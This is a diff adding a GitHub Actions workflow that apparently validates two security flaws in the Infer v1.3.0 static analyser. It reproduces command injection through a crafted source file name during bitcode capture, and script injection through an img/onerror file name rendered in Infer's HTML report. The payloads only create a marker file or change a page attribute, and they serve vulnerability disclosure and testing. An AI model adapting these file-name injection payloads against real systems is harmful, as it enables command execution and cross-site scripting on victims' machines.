@@ -1,0 +1,100 @@
+name: Infer security validation
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - name: Check out exact current Infer source
+        uses: actions/checkout@v4
+        with:
+          repository: facebook/infer
+          ref: cb4fcf8e1f571c02a669af978a6e69f3e2ddd062
+          path: infer-source
+          persist-credentials: false
+
+      - name: Download and verify official Infer v1.3.0 release
+        run: |
+          mkdir -p release
+          curl -fL --retry 5 \
+            https://github.com/facebook/infer/releases/download/v1.3.0/infer-linux-x86_64-v1.3.0.tar.xz \
+            -o release/infer-linux-x86_64-v1.3.0.tar.xz
+          echo '02be62ba931cb43e2d42bbf7abf4bd9a410cf8464cce5453934e25c90a825850  release/infer-linux-x86_64-v1.3.0.tar.xz' \
+            | sha256sum -c -
+          tar -xJf release/infer-linux-x86_64-v1.3.0.tar.xz -C release
+          release/infer-linux-x86_64-v1.3.0/bin/infer --version
+          echo '0fb75c7d72d9f2891d7303bfb6c48f5b6fd1ba279f60a9e8db3a9f06ba2090ce  infer-source/infer/src/integration/Bitcode.ml' \
+            | sha256sum -c -
+          echo 'd2a21e1b82a4775ab264050b61ac8f7b424e0513ed1f6cd5c58b6ec3f45d4f4c  infer-source/infer/src/integration/TraceBugs.ml' \
+            | sha256sum -c -
+
+      - name: Reproduce LLVM bitcode source-filename command injection
+        run: |
+          proof_dir=$(mktemp -d "$RUNNER_TEMP/infer-command.XXXXXX")
+          payload='x$(touch${IFS}INFER_LLVM_MARKER).c'
+          printf '%s\n' 'int main(void) { return 0; }' > "$proof_dir/$payload"
+
+          (
+            cd "$proof_dir"
+            clang -emit-llvm -c -o /dev/null "$payload"
+          )
+          test ! -e "$proof_dir/INFER_LLVM_MARKER"
+          echo 'control_marker=absent'
+
+          set +e
+          (
+            cd "$proof_dir"
+            "$GITHUB_WORKSPACE/release/infer-linux-x86_64-v1.3.0/bin/infer" \
+              capture --bitcode-capture -- clang -c "$payload"
+          ) >"$proof_dir/infer.log" 2>&1
+          infer_status=$?
+          set -e
+          sed -n '1,180p' "$proof_dir/infer.log"
+          echo "infer_exit=$infer_status"
+          test -e "$proof_dir/INFER_LLVM_MARKER"
+          echo 'infer_marker=created'
+          echo 'command_injection_reproduced=true'
+
+      - name: Reproduce source-filename script execution in HTML report
+        run: |
+          proof_dir=$(mktemp -d "$RUNNER_TEMP/infer-html.XXXXXX")
+          payload="x<img src=x onerror=document.body.id='infer-xss'>.c"
+          printf '%s\n' \
+            'int main(void) {' \
+            '  int *ptr = 0;' \
+            '  return *ptr;' \
+            '}' > "$proof_dir/$payload"
+
+          (
+            cd "$proof_dir"
+            "$GITHUB_WORKSPACE/release/infer-linux-x86_64-v1.3.0/bin/infer" \
+              run -- clang -c "$payload"
+            "$GITHUB_WORKSPACE/release/infer-linux-x86_64-v1.3.0/bin/infer" explore --html
+          )
+
+          report_json="$proof_dir/infer-out/report.json"
+          report_html="$proof_dir/infer-out/report.html/index.html"
+          grep -F "$payload" "$report_json"
+          grep -F "<img src=x onerror=document.body.id='infer-xss'>" "$report_html"
+          echo 'raw_html_payload=present'
+
+          chrome_bin=$(command -v google-chrome || command -v chromium || true)
+          test -n "$chrome_bin"
+          "$chrome_bin" \
+            --headless \
+            --no-sandbox \
+            --disable-gpu \
+            --no-first-run \
+            --no-default-browser-check \
+            --user-data-dir="$proof_dir/chrome-profile" \
+            --dump-dom "file://$report_html" \
+            >"$proof_dir/rendered-dom.html" 2>"$proof_dir/chrome.log"
+          grep -F '<body id="infer-xss">' "$proof_dir/rendered-dom.html"
+          echo 'rendered_dom_marker=present'
+          echo 'html_injection_reproduced=true'
